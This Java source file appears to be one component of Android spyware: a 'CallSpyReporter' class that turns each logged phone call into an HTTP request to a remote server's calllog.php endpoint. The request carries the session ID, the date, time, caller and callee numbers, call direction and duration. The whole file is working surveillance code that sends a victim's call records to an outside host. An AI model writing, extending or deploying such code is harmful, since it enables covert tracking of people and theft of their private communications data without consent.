package org.ddth.android.spy.reporter;

import java.net.URLEncoder;

import org.ddth.http.core.connection.Request;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.Call;

public class CallSpyReporter extends SpyReporter {
	private static final String CALL_TYPE_UNKNOWN_TEXT = "Unknown";
	private static final String CALL_TYPE_INCOMING_TEXT = "Incoming";
	private static final String CALL_TYPE_OUTGOING_TEXT = "Outgoing";
	private static final String CALL_TYPE_MISSEDCALL_TEXT = "Misscall";
	
	@Override
	protected Request createRequest(Report report) {
		Call call = (Call) report;
		String date = LOG_DATE_FORMAT.format(call.date);
		String time = LOG_TIME_FORMAT.format(call.date);
		String duration = String.valueOf(call.duration);
		String dir = CALL_TYPE_UNKNOWN_TEXT;
		switch (call.type) {
		case Call.CALL_TYPE_INCOMING:
			dir = CALL_TYPE_INCOMING_TEXT;
			break;
			
		case Call.CALL_TYPE_OUTGOING:
			dir = CALL_TYPE_OUTGOING_TEXT;
			break;
			
		case Call.CALL_TYPE_MISSEDCALL:
			dir = CALL_TYPE_MISSEDCALL_TEXT;
			break;
		}
		
		return new Request(WEBAPI_SERVER_ROOT + "/calllog.php?sID=" + getSession() +
				"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time) +
				"&from=" + call.from + "&to=" + call.to +
				"&dir=" + dir + "&dur=" + URLEncoder.encode(duration));
	}
}
